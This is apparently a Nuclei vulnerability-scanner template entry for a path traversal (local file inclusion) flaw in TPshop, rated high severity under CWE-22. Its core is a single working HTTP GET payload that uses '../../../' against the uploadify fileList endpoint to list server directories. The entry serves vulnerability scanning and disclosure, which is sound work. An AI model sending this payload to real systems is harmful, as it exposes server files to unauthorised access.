# Nuclei Template: TPshop - Local File Inclusion
**Template ID:** tpshop-directory-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`tpshop-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
TPshop is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../
```

## References
- https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
